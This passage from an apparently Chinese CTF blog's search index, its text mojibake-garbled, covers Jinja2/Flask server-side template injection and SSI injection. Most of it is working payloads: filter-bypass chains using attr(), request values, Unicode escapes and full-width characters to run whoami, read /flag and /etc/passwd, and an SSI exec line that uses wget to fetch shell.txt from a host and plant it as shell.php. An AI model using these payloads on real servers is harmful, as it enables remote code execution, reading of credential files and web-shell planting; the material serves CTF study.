title="è¿‡æ»¤argså’Œ.å’Œ_"></a>è¿‡æ»¤argså’Œ.å’Œ_</h2><p>ä¹‹å‰æŸäºŒæœˆèµ›åœ¨y1ngå¸ˆå‚…åšå®¢çœ‹åˆ°çš„ä¸€ä¸ªpayloadï¼ŒåŸç†å¹¶ä¸éš¾ï¼Œè¿™é‡Œä½¿ç”¨äº†attr()ç»•è¿‡ç‚¹ï¼Œvaluesç»•è¿‡argsï¼Œpayloadå¦‚ä¸‹</p><pre><code class="python">&#123;&#123;()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])&#125;&#125;post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#39;whoami&#39;).read()</code></pre><h2 id="å¯¼å…¥ä¸»å‡½æ•°è¯»å–å˜é‡"><a href="#å¯¼å…¥ä¸»å‡½æ•°è¯»å–å˜é‡" class="headerlink" title="å¯¼å…¥ä¸»å‡½æ•°è¯»å–å˜é‡"></a>å¯¼å…¥ä¸»å‡½æ•°è¯»å–å˜é‡</h2><p>æœ‰ä¸€äº›é¢˜ç›®æˆ‘ä»¬ä¸å¹¶éœ€è¦å»getshellï¼Œæ¯”å¦‚flagç›´æ¥æš´éœ²åœ¨å˜é‡é‡Œé¢äº†ï¼Œåƒå¦‚ä¸‹è¿™æ ·æŠŠ/flagæ–‡ä»¶åŠ è½½åˆ°flagè¿™ä¸ªå˜é‡é‡Œé¢äº†</p><pre><code class="python">f = open(&#39;/flag&#39;,&#39;r&#39;)flag = f.read()</code></pre><p>æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡importæ˜¯å¯¼å…¥__main__ä¸»å‡½æ•°å»è¯»å˜é‡ï¼Œpayloadå¦‚ä¸‹</p><pre><code class="python">&#123;%print request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('__main__').flag %&#125;</code></pre><h2 id="Unicodeç»•è¿‡"><a href="#Unicodeç»•è¿‡" class="headerlink" title="Unicodeç»•è¿‡"></a>Unicodeç»•è¿‡</h2><p>è¿™ç§æ–¹æ³•æ˜¯ä»å®‰æ´µæ¯2020 å®˜æ–¹Writeupå­¦åˆ°çš„ï¼Œæˆ‘ä»¬ç›´å¥”ä¸»é¢˜çœ‹payload</p><pre><code class="python">&#123;%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%&#125;</code></pre><pre><code class="python">è¿™é‡Œçš„printç»•è¿‡&#123;&#123;&#125;&#125;å’Œattrç»•è¿‡.ä¸Šé¢å·²ç»è¯´è¿‡äº†è¿™é‡Œä¸èµ˜è¿°ç„¶åè¿™é‡Œçš„lipsumç”¨&#123;&#123;lipsum&#125;&#125;æµ‹äº†ä¸€ä¸‹å‘ç°æ˜¯ä¸ªæ–¹æ³•&lt;function generate_lorem_ipsum at 0x7fcddfa296a8&gt;</code></pre><p>ç„¶åç”¨ä»–ç›´æ¥è°ƒç”¨__globals__å‘ç°å¯ä»¥ç›´æ¥æ‰§è¡Œoså‘½ä»¤ï¼Œæµ‹äº†ä¸€ä¸‹å‘ç°__builtins__ä¹Ÿå¯ä»¥ç”¨ï¼Œåˆå­¦åˆ°äº†ä¸€ç§æ–°æ–¹æ³•ï¼Œåªèƒ½è¯´å¸ˆå‚…ä»¬tql</p><pre><code class="python">&#123;&#123;lipsum.__globals__['os'].popen('whoami').read()&#125;&#125;&#123;&#123;lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;</code></pre><p>å›åˆ°æ­£é¢˜ï¼Œè¿™é‡Œä½¿ç”¨äº†Unicodeç¼–ç ç»•è¿‡å…³é”®å­—ï¼Œä¸‹é¢ä¸¤è¡Œæ˜¯ç­‰ä»·çš„</p><pre><code class="python">&#123;&#123;()|attr("__class__")&#125;&#125;&#123;&#123;()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")&#125;&#125;</code></pre><p>çŸ¥é“äº†è¿™ä¸¤ç‚¹ä¹‹åï¼Œé‚£ä¸ªå®˜æ–¹ç»™çš„payloadå°±å¾ˆæ˜æœ—äº†ï¼Œè§£å¼€ç¼–ç åå¦‚ä¸‹</p><pre><code class="python">&#123;%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%&#125;</code></pre><p>ç„¶åæˆ‘è¿™é‡Œé¡ºä¾¿ç»™ä¸ªUnicodeäº’è½¬çš„phpè„šæœ¬</p><pre><code class="python">&lt;?php//å­—ç¬¦ä¸²è½¬Unicodeç¼–ç function unicode_encode($strLong) &#123;  $strArr = preg_split(&#39;/(?&lt;!^)(?!$)/u&#39;, $strLong);//æ‹†åˆ†å­—ç¬¦ä¸²ä¸ºæ•°ç»„(å«ä¸­æ–‡å­—ç¬¦)  $resUnicode = &#39;&#39;;  foreach ($strArr as $str)  &#123;      $bin_str = &#39;&#39;;      $arr = is_array($str) ? $str : str_split($str);//è·å–å­—ç¬¦å†…éƒ¨æ•°ç»„è¡¨ç¤º,æ­¤æ—¶$arråº”ç±»ä¼¼array(228, 189, 160)      foreach ($arr as $value)      &#123;          $bin_str .= decbin(ord($value));//è½¬æˆæ•°å­—å†è½¬æˆäºŒè¿›åˆ¶å­—ç¬¦ä¸²,$bin_stråº”ç±»ä¼¼111001001011110110100000,å¦‚æœæ˜¯æ±‰å­—&quot;ä½ &quot;      &#125;      $bin_str = preg_replace(&#39;/^.&#123;4&#125;(.&#123;4&#125;).&#123;2&#125;(.&#123;6&#125;).&#123;2&#125;(.&#123;6&#125;)$/&#39;, &#39;$1$2$3&#39;, $bin_str);//æ­£åˆ™æˆªå–, $bin_stråº”ç±»ä¼¼0100111101100000,å¦‚æœæ˜¯æ±‰å­—&quot;ä½ &quot;      $unicode = dechex(bindec($bin_str));//è¿”å›unicodeåå…­è¿›åˆ¶      $_sup = &#39;&#39;;      for ($i = 0; $i &lt; 4 - strlen($unicode); $i++)      &#123;          $_sup .= &#39;0&#39;;//è¡¥ä½é«˜å­—èŠ‚ 0      &#125;      $str =  &#39;\\u&#39; . $_sup . $unicode; //åŠ ä¸Š \u  è¿”å›      $resUnicode .= $str;  &#125;  return $resUnicode;&#125;//Unicodeç¼–ç è½¬å­—ç¬¦ä¸²æ–¹æ³•1function unicode_decode($name)&#123;  // è½¬æ¢ç¼–ç ï¼Œå°†Unicodeç¼–ç è½¬æ¢æˆå¯ä»¥æµè§ˆçš„utf-8ç¼–ç   $pattern = &#39;/([\w]+)|(\\\u([\w]&#123;4&#125;))/i&#39;;  preg_match_all($pattern, $name, $matches);  if (!empty($matches))  &#123;    $name = &#39;&#39;;    for ($j = 0; $j &lt; count($matches[0]); $j++)    &#123;      $str = $matches[0][$j];      if (strpos($str, &#39;\\u&#39;) === 0)      &#123;        $code = base_convert(substr($str, 2, 2), 16, 10);        $code2 = base_convert(substr($str, 4), 16, 10);        $c = chr($code).chr($code2);        $c = iconv(&#39;UCS-2&#39;, &#39;UTF-8&#39;, $c);        $name .= $c;      &#125;      else      &#123;        $name .= $str;      &#125;    &#125;  &#125;  return $name;&#125;//Unicodeç¼–ç è½¬å­—ç¬¦ä¸²function unicode_decode2($str)&#123;  $json = &#39;&#123;&quot;str&quot;:&quot;&#39; . $str . &#39;&quot;&#125;&#39;;  $arr = json_decode($json, true);  if (empty($arr)) return &#39;&#39;;  return $arr[&#39;str&#39;];&#125;echo unicode_encode(&#39;__class__&#39;);echo unicode_decode(&#39;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#39;);//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__</code></pre><h1 id="é­”æ”¹å­—ç¬¦"><a href="#é­”æ”¹å­—ç¬¦" class="headerlink" title="é­”æ”¹å­—ç¬¦"></a>é­”æ”¹å­—ç¬¦</h1><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/image-20220223142618069.png" alt="image-20220223142618069"></p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/99b07c77bc934233b53852378b18075d.jpeg" alt="img"></p><p>å¯ä»¥åœ¨Unicodeå­—ç¬¦ç½‘ç«™å¯»æ‰¾ç»•è¿‡çš„å­—ç¬¦ï¼Œç›´æ¥åœ¨ç½‘å€æœç´¢{ï¼Œå°±ä¼šå‡ºç°ç±»ä¼¼çš„å­—ç¬¦ï¼Œå°±å¯ä»¥æ‰¾åˆ°ï¸·å’Œï¸¸äº†ï¼Œç½‘å€ï¼š<a href="https://www.compart.com/en/unicode/U+FE38">https://www.compart.com/en/unicode/U+FE38</a></p><p>payloadå¦‚ä¸‹</p><pre><code class="python">ï¸·ï¸·configï¸¸ï¸¸%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8</code></pre><p>è¿˜å¯ä»¥ä½¿ç”¨ä¸­æ–‡çš„å­—ç¬¦é­”æ”¹</p><pre><code class="python">ï½› &amp;#65371;ï½ &amp;#65373;ï¼» &amp;#65339;ï¼½ &amp;#65341;ï¼‡ &amp;#65287;ï¼‚ &amp;#65282;payloadå¦‚ä¸‹ï½›ï½›url_for.__globals__ï¼»ï¼‡__builtins__ï¼‡ï¼½ï¼»ï¼‡evalï¼‡ï¼½ï¼ˆï¼‡__import__ï¼ˆï¼‚osï¼‚ï¼‰.popenï¼ˆï¼‚cat /flagï¼‚ï¼‰.readï¼ˆï¼‰ï¼‡ï¼‰ï½ï½ </code></pre><hr><h1 id="åšé¢˜æ€è·¯ï¼š"><a href="#åšé¢˜æ€è·¯ï¼š" class="headerlink" title="åšé¢˜æ€è·¯ï¼š"></a>åšé¢˜æ€è·¯ï¼š</h1><p>é¦–å…ˆæ‰¾åˆ°æ¼æ´å­˜åœ¨ç‚¹ã€‚</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;</code></pre><p>é€šè¿‡è¿™ä¸ªè¾“å‡ºæ‰€æœ‰ç±»ã€‚</p><p>åœ¨å­ç±»åˆ—è¡¨ä¸­æ‰¾åˆ°å¯ä»¥getshellçš„ç±»/è®°ä½ä¸€äº›å¸¸è§çš„å¯ä»¥getshellçš„å‡½æ•°ã€‚</p><p>1ã€æœ‰popen()çš„ç±»</p><pre><code class="python">os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><pre><code class="python">subprocess.Popenpayload:?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></pre><p>2ã€æœ‰osæ¨¡å—çš„</p><p>socket._socketobjectï¼ˆä¸€èˆ¬åœ¨71ï¼‰ã€site._Printerç­‰æ¨¡å—</p><pre><code class="python">payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[127].__init__['__glo'+'bals__']['os'].popen('whoami').read()&#125;&#125;</code></pre><p>3ã€æœ‰builtinsçš„ç±»</p><p>__ builtins __ä»£ç æ‰§è¡Œï¼ˆæœ€å¸¸ç”¨çš„æ–¹æ³•ï¼‰</p><p>warnings.catch_warningså«æœ‰,å¸¸ç”¨çš„è¿˜æœ‰email.header._ValueFormatter</p><p>__ builtins __ æ˜¯ä¸€ä¸ªåŒ…å«äº†å¤§é‡å†…ç½®å‡½æ•°çš„ä¸€ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¹³æ—¶ç”¨pythonçš„æ—¶å€™ä¹‹æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€äº›å‡½æ•°æ¯”å¦‚absï¼Œmaxï¼Œå°±æ˜¯å› ä¸º__ builtins __ è¿™ç±»æ¨¡å—åœ¨Pythonå¯åŠ¨æ—¶ä¸ºæˆ‘ä»¬å¯¼å…¥äº†ï¼Œå¯ä»¥ä½¿ç”¨dir(__ builtins __ )æ¥æŸ¥çœ‹è°ƒç”¨æ–¹æ³•çš„åˆ—è¡¨ï¼Œç„¶åå¯ä»¥å‘ç°__ builtins __ ä¸‹æœ‰evalï¼Œ__ import __ç­‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><pre><code class="python">&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()&#125;&#125;</code></pre><p>æ¨¡æ¿è·‘å¾ªç¯</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>è¯»å–æ–‡ä»¶payload</p><pre><code class="python">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p>warnings.catch_warningsç±»åœ¨åœ¨å†…éƒ¨å®šä¹‰äº†_module=sys.modules[â€˜warningsâ€™]ï¼Œç„¶åwarningsæ¨¡å—åŒ…å«æœ‰__builtins__ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœå¯ä»¥æ‰¾åˆ°warnings.catch_warningsç±»ï¼Œåˆ™å¯ä»¥ä¸ä½¿ç”¨globalsï¼Œpayloadå¦‚ä¸‹</p><pre><code class="python">&#123;&#123;''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()&#125;&#125;</code></pre><p>æ€»è€Œè¨€ä¹‹ï¼ŒåŸç†éƒ½æ˜¯å…ˆæ‰¾åˆ°å«æœ‰__builtins__çš„ç±»ï¼Œç„¶åå†è¿›ä¸€æ­¥åˆ©ç”¨</p><p>å¸¸ç”¨è„šæœ¬ï¼š</p><p>æˆ‘ä»¬é¦–å…ˆæŠŠæ‰€æœ‰çš„å­ç±»åˆ—ä¸¾å‡ºæ¥</p><pre><code class="python">Python 3.7.8&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()...ä¸€å¤§å †çš„å­ç±»</code></pre><p>ç„¶åæŠŠå­ç±»åˆ—è¡¨æ”¾è¿›ä¸‹é¢è„šæœ¬ä¸­çš„aä¸­ï¼Œç„¶åå¯»æ‰¾os._wrap_closeè¿™ä¸ªç±»</p><p>find2.py</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¨¡æ¿æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssiæœåŠ¡ç«¯åŒ…å«æ³¨å…¥</title>
      <link href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>â€‹                                                      ssiæœåŠ¡ç«¯åŒ…å«æ³¨å…¥</p><p>SSI æ³¨å…¥å…¨ç§°Server-Side Includes Injectionï¼Œå³æœåŠ¡ç«¯åŒ…å«æ³¨å…¥ã€‚SSI æ˜¯ç±»ä¼¼äº CGIï¼Œç”¨äºåŠ¨æ€é¡µé¢çš„æŒ‡ä»¤ã€‚SSI æ³¨å…¥å…è®¸è¿œç¨‹åœ¨ Web åº”ç”¨ä¸­æ³¨å…¥è„šæœ¬æ¥æ‰§è¡Œä»£ç ã€‚</p><p>SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚</p><p>ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h1 id="SSI-é…ç½®å’Œè¯­æ³•"><a href="#SSI-é…ç½®å’Œè¯­æ³•" class="headerlink" title="SSI é…ç½®å’Œè¯­æ³•"></a>SSI é…ç½®å’Œè¯­æ³•</h1><h2 id="å¯ç”¨SSI"><a href="#å¯ç”¨SSI" class="headerlink" title="å¯ç”¨SSI"></a>å¯ç”¨SSI</h2><p>ç¤ºä¾‹ï¼šNginx é…ç½®SSIåŠŸèƒ½</p><p>åœ¨httpæ®µä¸­åŠ å…¥ä¸‹é¢å‡ å¥å³å¯ï¼š</p><pre><code>ssi on;ssi_silent_errors off;ssi_types text/shtml;</code></pre><p>é»˜è®¤Apacheä¸å¼€å¯SSIï¼ŒSSIè¿™ç§æŠ€æœ¯å·²ç»æ¯”è¾ƒå°‘ç”¨äº†ã€‚å¦‚æœåº”ç”¨æ²¡æœ‰ä½¿ç”¨åˆ°SSIï¼Œå…³é—­æœåŠ¡å™¨å¯¹SSIçš„æ”¯æŒå³å¯ã€‚</p><h2 id="SSIè¯­æ³•"><a href="#SSIè¯­æ³•" class="headerlink" title="SSIè¯­æ³•"></a>SSIè¯­æ³•</h2><p>é¦–å…ˆï¼Œä»‹ç»ä¸‹SHTMLï¼Œåœ¨SHTMLæ–‡ä»¶ä¸­ä½¿ç”¨SSIæŒ‡ä»¤å¼•ç”¨å…¶ä»–çš„htmlæ–‡ä»¶ï¼ˆ#includeï¼‰ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šå°†SHTMLä¸­åŒ…å«çš„SSIæŒ‡ä»¤è§£é‡Šï¼Œå†ä¼ é€ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶çš„HTMLä¸­å°±ä¸å†æœ‰SSIæŒ‡ä»¤äº†ã€‚æ¯”å¦‚è¯´æ¡†æ¶æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯é‡Œé¢çš„æ–‡ç« ï¼Œå…¶ä»–èœå•ç­‰å³å¯ä»¥ç”¨#includeå¼•ç”¨è¿›æ¥</p><pre><code class="html">â‘ æ˜¾ç¤ºæœåŠ¡å™¨ç«¯ç¯å¢ƒå˜é‡&lt;#echo&gt;æœ¬æ–‡æ¡£åç§°ï¼š&lt;!â€“#echo var=&quot;DOCUMENT_NAME&quot;â€“&gt;ç°åœ¨æ—¶é—´ï¼š&lt;!â€“#echo var=&quot;DATE_LOCAL&quot;â€“&gt;æ˜¾ç¤ºIPåœ°å€ï¼š&lt;! #echo var=&quot;REMOTE_ADDR&quot;â€“&gt;**â‘¡****å°†æ–‡æœ¬å†…å®¹ç›´æ¥æ’å…¥åˆ°æ–‡æ¡£ä¸­&lt;#include&gt;**&lt;! #include file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;æ³¨ï¼šfileåŒ…å«æ–‡ä»¶å¯ä»¥åœ¨åŒä¸€çº§ç›®å½•æˆ–å…¶å­ç›®å½•ä¸­ï¼Œä½†ä¸èƒ½åœ¨ä¸Šä¸€çº§ç›®å½•ä¸­ï¼ŒvirtualåŒ…å«æ–‡ä»¶å¯ä»¥æ˜¯Webç«™ç‚¹ä¸Šçš„è™šæ‹Ÿç›®å½•çš„å®Œæ•´è·¯å¾„    â‘¢æ˜¾ç¤ºWEBæ–‡æ¡£ç›¸å…³ä¿¡æ¯&lt;#flastmod&gt;&lt;#fsize&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°ç­‰)æ–‡ä»¶æœ€è¿‘æ›´æ–°æ—¥æœŸï¼š&lt;! #flastmod file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;æ–‡ä»¶çš„é•¿åº¦ï¼š&lt;!â€“#fsize file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;â‘£ç›´æ¥æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„å„ç§ç¨‹åº&lt;#exec&gt;(å¦‚CGIæˆ–å…¶ä»–å¯æ‰§è¡Œç¨‹åº)&lt;!â€“#exec cmd=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!â€“#exec cgi=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;â€“&gt;å°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¯æ’å…¥CGIç¨‹åºæˆ–è€…æ˜¯å¸¸è§„åº”ç”¨ç¨‹åºçš„è¾“å…¥ï¼Œè¿™å–å†³äºä½¿ç”¨çš„å‚æ•°æ˜¯cmdè¿˜æ˜¯cgiã€‚â‘¤è®¾ç½®SSIä¿¡æ¯æ˜¾ç¤ºæ ¼å¼&lt;#config&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°æ˜¾ç¤ºæ–¹å¼)â‘¥é«˜çº§SSIå¯è®¾ç½®å˜é‡ä½¿ç”¨ifæ¡ä»¶è¯­å¥ã€‚</code></pre><h1 id="æ¼æ´åœºæ™¯"><a href="#æ¼æ´åœºæ™¯" class="headerlink" title="æ¼æ´åœºæ™¯"></a>æ¼æ´åœºæ™¯</h1><p>åœ¨å¾ˆå¤šä¸šåŠ¡ä¸­ï¼Œç”¨æˆ·è¾“å…¥çš„å†…å®¹ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸­ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªå­˜åœ¨åå°„å‹XSSæ¼æ´çš„é¡µé¢ï¼Œå¦‚æœè¾“å…¥çš„payloadä¸æ˜¯XSSä»£ç è€Œæ˜¯SSIçš„æ ‡ç­¾ï¼ŒåŒæ—¶æœåŠ¡å™¨åˆå¼€å¯äº†å¯¹SSIçš„æ”¯æŒçš„è¯å°±ä¼šå­˜åœ¨SSIæ¼æ´ã€‚</p><p>ä»å®šä¹‰ä¸­çœ‹å‡ºï¼Œé¡µé¢ä¸­æœ‰ä¸€å°éƒ¨åˆ†æ˜¯åŠ¨æ€è¾“å‡ºçš„æ—¶å€™ä½¿ç”¨SSIï¼Œæ¯”å¦‚ï¼š</p><ul><li>æ–‡ä»¶ç›¸å…³çš„å±æ€§å­—æ®µ</li><li>å½“å‰æ—¶é—´</li><li>è®¿å®¢IP</li><li>è°ƒç”¨CGIç¨‹åº</li></ul><h1 id="SSIæ³¨å…¥çš„æ¡ä»¶"><a href="#SSIæ³¨å…¥çš„æ¡ä»¶" class="headerlink" title="SSIæ³¨å…¥çš„æ¡ä»¶"></a>SSIæ³¨å…¥çš„æ¡ä»¶</h1><p>å½“ç¬¦åˆä¸‹åˆ—æ¡ä»¶æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ Web æœåŠ¡å™¨ä¸Šè¿è¡Œä»»æ„å‘½ä»¤ï¼š</p><ul><li><p>Web æœåŠ¡å™¨å·²æ”¯æŒSSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰</p></li><li><p>Web åº”ç”¨ç¨‹åºæœªå¯¹å¯¹ç›¸å…³SSIå…³é”®å­—åšè¿‡æ»¤</p></li><li><p>Web åº”ç”¨ç¨‹åºåœ¨è¿”å›å“åº”çš„HTMLé¡µé¢æ—¶ï¼ŒåµŒå…¥ç”¨æˆ·è¾“å…¥</p></li><li><p>SSIæ³¨å…¥å¸¸ç”¨å‘½ä»¤ï¼š</p></li><li><pre><code class="html">ä¾‹å­ç¤ºä¾‹ 1ç”¨äºæ³¨å…¥ SSI çš„å‘½ä»¤å› ä½¿ç”¨çš„æœåŠ¡å™¨æ“ä½œç³»ç»Ÿè€Œå¼‚ã€‚ä»¥ä¸‹å‘½ä»¤è¡¨ç¤ºåº”ç”¨äºæ‰§è¡Œ OS å‘½ä»¤çš„è¯­æ³•ã€‚Linuxï¼šåˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š&lt;!--#exec cmd=&quot;ls&quot; --&gt;è®¿é—®ç›®å½•ï¼š&lt;!--#exec cmd=&quot;cd /root/dir/&quot;&gt;æ‰§è¡Œè„šæœ¬ï¼š&lt;!--#exec cmd=&quot;wget http://mysite.com/shell.txt | rename shell.txt shell.php&quot; --&gt;è§†çª—ï¼šåˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š&lt;!--#exec cmd=&quot;dir&quot; --&gt;è®¿é—®ç›®å½•ï¼š&lt;!--#exec cmd=&quot;cd C:\admin\dir&quot;&gt;ç¤ºä¾‹ 2å¯ç”¨äºè®¿é—®å’Œè®¾ç½®æœåŠ¡å™¨ä¿¡æ¯çš„å…¶ä»– SSI ç¤ºä¾‹ï¼šè¦æ›´æ”¹é”™è¯¯æ¶ˆæ¯è¾“å‡ºï¼š&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt;æ˜¾ç¤ºå½“å‰æ–‡æ¡£æ–‡ä»¶åï¼š&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;æ˜¾ç¤ºè™šæ‹Ÿè·¯å¾„å’Œæ–‡ä»¶åï¼š&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;ä½¿ç”¨â€œconfigâ€å‘½ä»¤å’Œâ€œtimefmtâ€å‚æ•°ï¼Œå¯ä»¥æ§åˆ¶æ—¥æœŸå’Œæ—¶é—´è¾“å‡ºæ ¼å¼ï¼š&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt;ä½¿ç”¨â€œfsizeâ€å‘½ä»¤ï¼Œå¯ä»¥æ‰“å°æ‰€é€‰æ–‡ä»¶çš„å¤§å°ï¼š&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt;ç¤ºä¾‹ 3IIS 4.0 å’Œ 5.0 